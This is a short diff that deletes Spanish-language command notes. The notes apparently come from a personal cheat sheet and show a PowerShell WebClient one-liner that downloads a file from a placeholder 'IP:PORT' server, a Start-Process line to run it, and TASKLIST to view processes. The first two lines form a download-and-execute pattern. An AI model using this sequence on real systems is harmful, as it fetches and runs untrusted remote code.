@@ -1,7 +1,0 @@
-descargar un archivo de un server:
-powershell “(New-Object System.Net.WebClient).Downloadfile(‘http://IP:PORT/path/file’,’name_of_downloaded_file’)”
-correrlo
-Start-Process "file"
-
-ver procesos desde cmd:
-TASKLIST
